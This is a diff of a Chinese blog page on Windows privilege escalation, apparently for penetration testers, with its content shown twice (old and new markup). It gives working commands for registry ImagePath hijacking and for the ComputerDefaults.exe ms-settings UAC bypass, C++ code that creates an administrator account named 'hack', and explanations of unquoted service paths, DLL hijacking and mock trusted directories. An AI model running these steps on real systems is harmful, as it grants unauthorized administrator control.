-&gt; Windows中的注册表记录了每个系统服务的一些具体条目，而注册表也会有一些`ACL`对其防护，以此来确定用户对注册表是否有其该拥有的访问权限。但如果注册表的ACL配置出错，那么就可以使一个低权限用户，对注册表拥有写入权限，从而进行修改ImagePath二进制文件路径，以此来达到提权的目的。
-
-1. 执行以下命令可以查看在Windows中“Authenticated Users”用户组对于哪些系统服务拥有写入权限</code></pre><p>accesschk.exe /accepteula -uvwqk &ldquo;Authenticated Users&rdquo; HKLM\SYSTEM\CurrentControlSet\Services</p>
-<pre tabindex="0"><code>
-
-
-2. 如果存在的话，可以将payload的路径上传至该服务的ImagePath键值</code></pre><p>reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\服务名称 /v ImagePath /t REG_EXPAND_SZ /d &ldquo;cmd.exe&rdquo;</p>
-<pre tabindex="0"><code>
-
-
-
-
-###### 未引用的服务路径
-
-&gt; 未引用的服务路径（Unquoted Service Path）漏洞也被称为`可信任的服务路径`（Trusted Service Path），它利用了Windows的文件解析路径的特性。当文件路径中含有**空格**时就会触发该漏洞。
-
-简单来说，在Windows当中如果引用的完整路径中含有空格但是没有有效的引号所将其引起来的话，那么对于该路径中的每一个空格，Windows都会按照从左至右的顺序`依次`寻找并`执行`与空格前名字相匹配的程序。
-
-我们来简单的举个例子：路径：**C:\Program Files\Sublime Text 3\Sublime Text.exe**，系统会依次执行下述程序：
-
-- C:\Program.exe
-- C:\Program Files\Sublime.exe
-- C:\Program Files\Sublime Text 3\Sublime.exe
-- C:\Program Files\Sublime Text 3\Sublime Text.exe
-
-我们可以将payload上传至上述路径中，在系统依次调用时会执行我们所上传的payload，从而达到提权的目的。**当然此方法的执行前提是，用户对以上可能存在路径拥有写入权限**。
-
-
-
-##### BypassUAC
-
-`用户账户控制`*UAC*是微软公司在Windows Vista及更高版本的操作系统中所采用的一种控制机制，可以阻止自动安装未经授权的应用并防止意外更改系统设置。其原理是通知用户是否对应用程序使用硬盘驱动器和系统文件授权，以达到帮助阻止恶意程序损坏系统效果。
-
-使用`UAC`可以使==应用程序和任务总是在非管理员账户的安全上下文中运行==，但管理员专门给系统授予管理员级别的访问权限时除外。`UAC`会阻止未经授权应用程序的自动安装，防止无意中对系统设置进行更改。
-
-`UAC`限制所有用户包括非RID500的管理员用户（**只有Administrator用户的RID为500**）使用标准用户登录到他们的计算机，并在标准用户的安全性上下文中访问资源和运行应用。
-
-当非`RID500`的管理员用户登录后，系统会为其创建两个单独的访问令牌——标准用户访问令牌和管理员访问令牌。标准用户访问令牌与管理员访问令牌相比只是移除了SID以及Windows管理特权，标准用户访问令牌只是用来启动一些不需要用到管理员权限所启动的程序，只有当需要用管理员权限启动一些更高级的服务时，才会用到管理员访问令牌来进行启动。
-
-在渗透测试中，测试人员可以通过绕过`UAC`机制，==使得非RID500的用户不通过批准可以直接使用管理员访问令牌，从而就可以获取管理员的管理权限==。
-
-**这只是一种绕过机制，并不是真正的提权！！**
-
-####### UAC白名单
-
-微软在用户`UAC`中为一些系统程序设置了白名单机制，所有白名单中的程序在需要管理员权限运行时，都不会再询问，而是以静默的方式自动提升到管理员权限运行。依照这一机制，我们可以对白名单内的程序采用dll注入、dll劫持或者注册表劫持，来绕过UAC。
-
-注意
-
-依照上文我们所说的方法，那么我们所要做的第一步就是要找到哪些程序位于UAC白名单之中。
-
-可以通过微软的官方工具**Sigcheck**和**Strings**，来进行查找。
-
-位于UAC白名单中的程序有一个特点，就是`Manifest`数据中的`autoElevate`属性的值为**True**。
-
-- **Signcheck**可以检测程序是否具有autoElevate属性。
-
-&gt; 下载地址：[Sigcheck - Sysinternals | Microsoft Learn](https://learn.microsoft.com/zh-cn/sysinternals/downloads/sigcheck)
-
-以下图为例，位于**C:/windows/system32/**的`computerdefaults.exe`是一个白名单程序，我们可以使用命令：</code></pre><p>sigcheck.exe /accepteula -m 路径</p>
-<pre tabindex="0"><code>
-
-
-- Strings可以找出所有具有autoElevare属性的程序
-
-使用命令：`strings.exe /accepteula -s C:\windows\system32\*.exe | findstr /i &#34;autoElevate&#34;`
-
-在找到具有autoElevare属性的程序后，我们可以通过一些别的手段来达到绕过UAC的目的。
-
-Tip
-
-在这里我们以上文提到的ComputerDefaults.exe为例，来为各位简单介绍一下。
-
-1. 我们首先到C:\Windows\System32下找到ComputerDefaults.exe这个程序，
-
-2. 双击运行，
-
-3. 会发现直接打开了设置中的“默认应用”界面，而并没有触发UAC保护机制。
-
-   1. 然后我们使用进程监视器ProcessMoniotr，来对ComputerDefaults.exe进程的所有操作行为进行监控。可以发现，ComputerDefaults.exe会先查询注册表`HKCU\Software\Classes\ms-settings\shell\open\command`中的数据，发现该路径不存在后，继续查询注册表`HKCR\ms-settings\Shell\Open\Command\DelegateExecute`中的数据并读取。
-
-      一般以&#34;`shell\open\command`“命名的注册表中存储的一般都是可执行文件的路径，程序会读取其中的键值来获取相应可执行文件的路径，并进一步运行该键值所指明的可执行文件。但是由于ComputerDefaults.exe属于UAC白名单程序，所以在运行ComputerDefautls.exe时会默认已管理员权限运行，而其所调用的**注册表中的可执行文件**也会已管理员权限运行。
-
-   2. 执行以下命令
-
-      ```
-      reg add &#34;HKCU\Software\Classes\ms-settings\shell\open\command&#34; /d &#34;C:\Windows\System32\add_user.exe&#34; /f
-      
-      reg add &#34;HKCU\Software\Classes\ms-setting\shell\open\command&#34; /v DelegateExecute /t REG_SZ /d &#34;C:/Windows\System32\add_user.exe&#34; /f
-      ```
-
-      解释一下👆两条命令的意思：**在注册表`HKCU\Software\Classes\ms-settings\shell\open\command`（如果没有就创建）中将要执行的payload分别写入“默认值”和“DelegateExecute值”，（\*在上面的命令中写入的路径为：C:\Windows\System32\add_user.exe\*）。**
-
-      以下为cmd.cpp的源代码,意在创建一个账户名为hack，密码为hack的账户，并将其添加至Administrators组中。
-
-      ```
-#####include&lt;iostream&gt;
-#####include&lt;windows.h&gt;
-#####include&lt;cstdio&gt;
-      using namespace std;
-      int main()
-      {
-      	system(&#34;net user hack hack /add&#34;);
-      	system(&#34;net localgroup administrators hack /add&#34;);
-      	return 0;
-       } 
-      
-      ```
-
-      下图以标准用户权限执行，因为**标准用户对该注册表拥有修改键值权限**。
-
-      然后再次执行ComputerDefautls.exe之后，我们所创建的恶意程序也会已管理员权限执行。按照我们上文所放置的恶意程序，在执行之后，会新增一个具有管理员权限名为**hack**的用户。
-
-如果在注册表键值处修改成`C:/Windows\System32\cmd.exe`，那么再重新启动ComputerDefaults.exe时会重新打开一个拥有管理权权限的cmd。
-
-####### DLL劫持
-
-&gt; 在Windows中我们使用的最多的一种文件，是以.exe为后缀的可执行文件，但大多数情况下，很多应用程序并不是一个完整的可执行文件，而是被分割成一些相对独立的动态链接库（`Dynamic Link Library，DLL`）文件，而dll文件中通常会包括一些程序运行所需要使用的代码和数据。当我们所使用的应用程序启动时，程序运行所需的dll文件就会被加载到程序进程的内存空间中。而测试人员可以通过一些手段，在某些应用程序启动时加载恶意的dll文件。以上这整个行为就被称为：**DLL劫持**
-
-当应用程序需要加载dll文件时，如果没有指定给出相应的dll文件的绝对位置，那么程序将会以一种特定的方式顺序依次在指定路径下搜索等待加载的dll文件。在开启`安全DLL搜索模式（SafeDllSearchMode，windowsXP SP2后默认开启）`，将按照以下方式搜索：
-
-程序安装目录➡️系统目录(C:\windows\system32)➡️16位系统目录(C:\windows\system)➡️Windows目录(C:\Windows)➡️当前工作目录➡️PATH环境变量中列出的各个目录
-
-如果我们将恶意的dll文件名替换成合法的dll文件名，并将其放在之前合法的dll文件处，在应用程序重新加载dll文件时，就会触发我们放置好的恶意dll文件，放置恶意dll文件的前提是**对上述目录有写入权限**，**并且恶意dll文件与原始合法dll文件具有相同的导出表函数**。**这就是dll预加载劫持情景**。
-
-####### 模拟可信任目录
-
-&gt; 我们在上文中提到UAC白名单程序是一种可以不显示询问弹窗，就可以自动提升权限的应用程序，白名单程序有一个共同的特性就是Mainfest中autoElevate属性值为True。
-
-当启动的程序需要使用管理员权限时，系统会先读取可执行文件的Mainfest信息，获取其autoElevate属性值是否为True，如果是True，则会认为这是一个可自动提升权限的可执行文件。同时，系统也会检查可执行文件的签名，因此无法通过伪造Mainfest信息来伪造UAC白名单程序。除此之外，系统还会检查该可执行文件是否位于系统可信任目录中，比如`C:\windows\system32`目录中。当这三个条件全都吻合后，才会自动将可执行文件以高权限执行。
-
-在系统检查可信任目录时，相关的系统函数会自动去掉可执行文件路径中的空格。
-
-举例：如果一个可执行文件位于`C:\Windows \system32`目录中（在Windows后有一空格），系统会在检查是否好时可信任目录时去掉空格，就会将路径变为`C:\Windows\system32`（在Windows后没有空格了），这样就绕过了可信任目录的检查。
-
-基于这个原理，测试人员可以依照所知的可信任目录，来模拟创建一个假的可信任目录（在某些地方以空格填充），将一个白名单程序复制到我们所创建的模拟可信任目录中，配合DLL劫持等技术，即可绕过UAC。</code></pre></div><div class="post-footer" id="post-footer">
+</h2><blockquote>
+<p>Windows中的注册表记录了每个系统服务的一些具体条目，而注册表也会有一些<code>ACL</code>对其防护，以此来确定用户对注册表是否有其该拥有的访问权限。但如果注册表的ACL配置出错，那么就可以使一个低权限用户，对注册表拥有写入权限，从而进行修改ImagePath二进制文件路径，以此来达到提权的目的。</p>
+</blockquote>
+<ol>
+<li>
+<p>执行以下命令可以查看在Windows中“Authenticated Users”用户组对于哪些系统服务拥有写入权限</p>
+<pre tabindex="0"><code>accesschk.exe /accepteula -uvwqk &#34;Authenticated Users&#34; HKLM\SYSTEM\CurrentControlSet\Services</code></pre></li>
+<li>
+<p>如果存在的话，可以将payload的路径上传至该服务的ImagePath键值</p>
+<pre tabindex="0"><code>reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\服务名称 /v ImagePath /t REG_EXPAND_SZ /d &#34;cmd.exe&#34;</code></pre></li>
+</ol>
+<h2 id="未引用的服务路径" class="heading-element"><span>未引用的服务路径</span>
+  <a href="#%e6%9c%aa%e5%bc%95%e7%94%a8%e7%9a%84%e6%9c%8d%e5%8a%a1%e8%b7%af%e5%be%84" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><blockquote>
+<p>未引用的服务路径（Unquoted Service Path）漏洞也被称为<code>可信任的服务路径</code>（Trusted Service Path），它利用了Windows的文件解析路径的特性。当文件路径中含有<strong>空格</strong>时就会触发该漏洞。</p>
+</blockquote>
+<p>简单来说，在Windows当中如果引用的完整路径中含有空格但是没有有效的引号所将其引起来的话，那么对于该路径中的每一个空格，Windows都会按照从左至右的顺序<code>依次</code>寻找并<code>执行</code>与空格前名字相匹配的程序。</p>
+<p>我们来简单的举个例子：路径：<strong>C:\Program Files\Sublime Text 3\Sublime Text.exe</strong>，系统会依次执行下述程序：</p>
+<ul>
+<li>C:\Program.exe</li>
+<li>C:\Program Files\Sublime.exe</li>
+<li>C:\Program Files\Sublime Text 3\Sublime.exe</li>
+<li>C:\Program Files\Sublime Text 3\Sublime Text.exe</li>
+</ul>
+<p>我们可以将payload上传至上述路径中，在系统依次调用时会执行我们所上传的payload，从而达到提权的目的。<strong>当然此方法的执行前提是，用户对以上可能存在路径拥有写入权限</strong>。</p>
+<h1 id="bypassuac" class="heading-element"><span>BypassUAC</span>
+  <a href="#bypassuac" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p><code>用户账户控制</code><em>UAC</em>是微软公司在Windows Vista及更高版本的操作系统中所采用的一种控制机制，可以阻止自动安装未经授权的应用并防止意外更改系统设置。其原理是通知用户是否对应用程序使用硬盘驱动器和系统文件授权，以达到帮助阻止恶意程序损坏系统效果。</p>
+<p>使用<code>UAC</code>可以使==应用程序和任务总是在非管理员账户的安全上下文中运行==，但管理员专门给系统授予管理员级别的访问权限时除外。<code>UAC</code>会阻止未经授权应用程序的自动安装，防止无意中对系统设置进行更改。</p>
+<p><code>UAC</code>限制所有用户包括非RID500的管理员用户（<strong>只有Administrator用户的RID为500</strong>）使用标准用户登录到他们的计算机，并在标准用户的安全性上下文中访问资源和运行应用。</p>
+<p>当非<code>RID500</code>的管理员用户登录后，系统会为其创建两个单独的访问令牌——标准用户访问令牌和管理员访问令牌。标准用户访问令牌与管理员访问令牌相比只是移除了SID以及Windows管理特权，标准用户访问令牌只是用来启动一些不需要用到管理员权限所启动的程序，只有当需要用管理员权限启动一些更高级的服务时，才会用到管理员访问令牌来进行启动。</p>
+<p>在渗透测试中，测试人员可以通过绕过<code>UAC</code>机制，==使得非RID500的用户不通过批准可以直接使用管理员访问令牌，从而就可以获取管理员的管理权限==。</p>
+<p><strong>这只是一种绕过机制，并不是真正的提权！！</strong></p>
+<h3 id="uac白名单" class="heading-element"><span>UAC白名单</span>
+  <a href="#uac%e7%99%bd%e5%90%8d%e5%8d%95" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>微软在用户<code>UAC</code>中为一些系统程序设置了白名单机制，所有白名单中的程序在需要管理员权限运行时，都不会再询问，而是以静默的方式自动提升到管理员权限运行。依照这一机制，我们可以对白名单内的程序采用dll注入、dll劫持或者注册表劫持，来绕过UAC。</p>
+<p>注意</p>
+<p>依照上文我们所说的方法，那么我们所要做的第一步就是要找到哪些程序位于UAC白名单之中。</p>
+<p>可以通过微软的官方工具<strong>Sigcheck</strong>和<strong>Strings</strong>，来进行查找。</p>
+<p>位于UAC白名单中的程序有一个特点，就是<code>Manifest</code>数据中的<code>autoElevate</code>属性的值为<strong>True</strong>。</p>
+<ul>
+<li><strong>Signcheck</strong>可以检测程序是否具有autoElevate属性。</li>
+</ul>
+<blockquote>
+<p>下载地址：<a href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/sigcheck"target="_blank" rel="external nofollow noopener noreferrer">Sigcheck - Sysinternals | Microsoft Learn</a></p>
+</blockquote>
+<p>以下图为例，位于**C:/windows/system32/**的<code>computerdefaults.exe</code>是一个白名单程序，我们可以使用命令：</p>
+<pre tabindex="0"><code>sigcheck.exe /accepteula -m 路径</code></pre><ul>
+<li>Strings可以找出所有具有autoElevare属性的程序</li>
+</ul>
+<p>使用命令：<code>strings.exe /accepteula -s C:\windows\system32\*.exe | findstr /i &quot;autoElevate&quot;</code></p>
+<p>在找到具有autoElevare属性的程序后，我们可以通过一些别的手段来达到绕过UAC的目的。</p>
+<p>Tip</p>
+<p>在这里我们以上文提到的ComputerDefaults.exe为例，来为各位简单介绍一下。</p>
+<ol>
+<li>
+<p>我们首先到C:\Windows\System32下找到ComputerDefaults.exe这个程序，</p>
+</li>
+<li>
+<p>双击运行，</p>
+</li>
+<li>
+<p>会发现直接打开了设置中的“默认应用”界面，而并没有触发UAC保护机制。</p>
+<ol>
+<li>
+<p>然后我们使用进程监视器ProcessMoniotr，来对ComputerDefaults.exe进程的所有操作行为进行监控。可以发现，ComputerDefaults.exe会先查询注册表<code>HKCU\Software\Classes\ms-settings\shell\open\command</code>中的数据，发现该路径不存在后，继续查询注册表<code>HKCR\ms-settings\Shell\Open\Command\DelegateExecute</code>中的数据并读取。</p>
+<p>一般以&quot;<code>shell\open\command</code>“命名的注册表中存储的一般都是可执行文件的路径，程序会读取其中的键值来获取相应可执行文件的路径，并进一步运行该键值所指明的可执行文件。但是由于ComputerDefaults.exe属于UAC白名单程序，所以在运行ComputerDefautls.exe时会默认已管理员权限运行，而其所调用的<strong>注册表中的可执行文件</strong>也会已管理员权限运行。</p>
+</li>
+<li>
+<p>执行以下命令</p>
+<pre tabindex="0"><code>reg add &#34;HKCU\Software\Classes\ms-settings\shell\open\command&#34; /d &#34;C:\Windows\System32\add_user.exe&#34; /f
+
+reg add &#34;HKCU\Software\Classes\ms-setting\shell\open\command&#34; /v DelegateExecute /t REG_SZ /d &#34;C:/Windows\System32\add_user.exe&#34; /f</code></pre><p>解释一下👆两条命令的意思：<strong>在注册表<code>HKCU\Software\Classes\ms-settings\shell\open\command</code>（如果没有就创建）中将要执行的payload分别写入“默认值”和“DelegateExecute值”，（*在上面的命令中写入的路径为：C:\Windows\System32\add_user.exe*）。</strong></p>
+<p>以下为cmd.cpp的源代码,意在创建一个账户名为hack，密码为hack的账户，并将其添加至Administrators组中。</p>
+<pre tabindex="0"><code>#include&lt;iostream&gt;
+#include&lt;windows.h&gt;
+#include&lt;cstdio&gt;
+using namespace std;
+int main()
+{
+	system(&#34;net user hack hack /add&#34;);
+	system(&#34;net localgroup administrators hack /add&#34;);
+	return 0;
+ } </code></pre><p>下图以标准用户权限执行，因为<strong>标准用户对该注册表拥有修改键值权限</strong>。</p>
+<p>然后再次执行ComputerDefautls.exe之后，我们所创建的恶意程序也会已管理员权限执行。按照我们上文所放置的恶意程序，在执行之后，会新增一个具有管理员权限名为<strong>hack</strong>的用户。</p>
+</li>
+</ol>
+</li>
+</ol>
+<p>如果在注册表键值处修改成<code>C:/Windows\System32\cmd.exe</code>，那么再重新启动ComputerDefaults.exe时会重新打开一个拥有管理权权限的cmd。</p>
+<h3 id="dll劫持" class="heading-element"><span>DLL劫持</span>
+  <a href="#dll%e5%8a%ab%e6%8c%81" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><blockquote>
+<p>在Windows中我们使用的最多的一种文件，是以.exe为后缀的可执行文件，但大多数情况下，很多应用程序并不是一个完整的可执行文件，而是被分割成一些相对独立的动态链接库（<code>Dynamic Link Library，DLL</code>）文件，而dll文件中通常会包括一些程序运行所需要使用的代码和数据。当我们所使用的应用程序启动时，程序运行所需的dll文件就会被加载到程序进程的内存空间中。而测试人员可以通过一些手段，在某些应用程序启动时加载恶意的dll文件。以上这整个行为就被称为：<strong>DLL劫持</strong></p>
+</blockquote>
+<p>当应用程序需要加载dll文件时，如果没有指定给出相应的dll文件的绝对位置，那么程序将会以一种特定的方式顺序依次在指定路径下搜索等待加载的dll文件。在开启<code>安全DLL搜索模式（SafeDllSearchMode，windowsXP SP2后默认开启）</code>，将按照以下方式搜索：</p>
+<p>程序安装目录➡️系统目录(C:\windows\system32)➡️16位系统目录(C:\windows\system)➡️Windows目录(C:\Windows)➡️当前工作目录➡️PATH环境变量中列出的各个目录</p>
+<p>如果我们将恶意的dll文件名替换成合法的dll文件名，并将其放在之前合法的dll文件处，在应用程序重新加载dll文件时，就会触发我们放置好的恶意dll文件，放置恶意dll文件的前提是<strong>对上述目录有写入权限</strong>，<strong>并且恶意dll文件与原始合法dll文件具有相同的导出表函数</strong>。<strong>这就是dll预加载劫持情景</strong>。</p>
+<h3 id="模拟可信任目录" class="heading-element"><span>模拟可信任目录</span>
+  <a href="#%e6%a8%a1%e6%8b%9f%e5%8f%af%e4%bf%a1%e4%bb%bb%e7%9b%ae%e5%bd%95" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><blockquote>
+<p>我们在上文中提到UAC白名单程序是一种可以不显示询问弹窗，就可以自动提升权限的应用程序，白名单程序有一个共同的特性就是Mainfest中autoElevate属性值为True。</p>
+</blockquote>
+<p>当启动的程序需要使用管理员权限时，系统会先读取可执行文件的Mainfest信息，获取其autoElevate属性值是否为True，如果是True，则会认为这是一个可自动提升权限的可执行文件。同时，系统也会检查可执行文件的签名，因此无法通过伪造Mainfest信息来伪造UAC白名单程序。除此之外，系统还会检查该可执行文件是否位于系统可信任目录中，比如<code>C:\windows\system32</code>目录中。当这三个条件全都吻合后，才会自动将可执行文件以高权限执行。</p>
+<p>在系统检查可信任目录时，相关的系统函数会自动去掉可执行文件路径中的空格。</p>
+<p>举例：如果一个可执行文件位于<code>C:\Windows \system32</code>目录中（在Windows后有一空格），系统会在检查是否好时可信任目录时去掉空格，就会将路径变为<code>C:\Windows\system32</code>（在Windows后没有空格了），这样就绕过了可信任目录的检查。</p>
+<p>基于这个原理，测试人员可以依照所知的可信任目录，来模拟创建一个假的可信任目录（在某些地方以空格填充），将一个白名单程序复制到我们所创建的模拟可信任目录中，配合DLL劫持等技术，即可绕过UAC。</p></div><div class="post-footer" id="post-footer">
   <div class="post-info">
     <div class="post-info-line">
       <div class="post-info-mod">
